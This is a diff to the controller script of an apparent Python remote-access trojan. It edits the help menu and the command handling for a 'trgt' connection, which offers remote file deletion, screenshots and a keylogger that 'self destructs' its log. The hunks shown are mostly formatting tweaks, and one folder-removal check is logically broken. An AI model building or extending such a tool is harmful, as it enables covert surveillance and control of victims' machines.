@@ -26,7 +26,7 @@ def recv_eff():
 
 	while True:
 		try:
-			data = data + trgt.recv(1024).decode('utf-8').rstrip()# decoding data and striping out EOL spacing
+			data = data + trgt.recv(1024).decode('utf-8').rstrip() # decoding data and striping out EOL spacing
 			return json.loads(data)
 
 		except ValueError:
@@ -157,7 +157,7 @@ mkdir <directory>
 (linux/windows)               :    To make folders
 
 touch <file>
-(linux)                       :    To make files
+(linux/win)                   :    To make files
 
 echo "<something>"            :    To display line of text/string that are passed as an argument
 
@@ -167,9 +167,13 @@ echo "<something>" >/>> file  :    To redirect text to a file, make files
 cd <directory>
 (linux/win)                   :    To change directory/folder
 
-rm <file> (linux)             :    To remove files
+del <file>                    :    To remove files
+(linux/win)
 
-del <file> (windows)          :    To remove files
+rmdir <folder>
+OR                            :    To remove folder
+rm -r <folder>
+(linux/windows)
 
 clear / cls (linux/windows)   :    To clear terminal/cmd
 (Can be used interchangeably)
@@ -188,12 +192,8 @@ keylog_dump                   :    To print keystrokes
 
 keylog_off                    :    To close keylogger and self destruct the logged file
 ''', 'green'))
-			print(colored('''
-You can also use other commands related to networking, etc for linux as well as windows
-''','yellow'))
-			print(colored('''
-------------------------------------------------------------------------------------------
-''','green'))
+			print(colored('You can also use other commands related to networking, etc for linux as well as windows','yellow'))
+			print(colored('''------------------------------------------------------------------------------------------''','green'))
 
 		# Making folder/directory in linux and windows ✓
 		elif cmd[:5] == "mkdir" and len(cmd) > 1:
@@ -202,7 +202,6 @@ You can also use other commands related to networking, etc for linux as well as 
 
 		# Making file in linux ✓
 		elif cmd[:5] == "touch" and len(cmd) > 1:
-
 			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 		# Editing/writing on file on linux and windows ✓
@@ -227,20 +226,19 @@ You can also use other commands related to networking, etc for linux as well as 
 		# Changing directory  ✓
 		elif cmd[:2] == "cd" and len(cmd) > 1:
 
-			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+			continue                           # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
-		# Removing file path in linux  ✓
-		elif cmd[:2] == "rm" and len(cmd) > 1:
-
-			continue 			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
-
-
-		# Removing file path in Win  ✓
+                # Removing file path in Win and linux  ✓
 		elif cmd[:3] == "del" and len(cmd) > 1:
 
 			continue   			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
+
+                # Removing folder in linux and Win
+		elif (cmd[:2] == 'rm' and cmd.find('-r') and len(cmd) > 1) or (cmd[:5] == 'rmdir' and len(cmd) > 1):
+
+			continue 			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 		# Screenshot    ✓
 
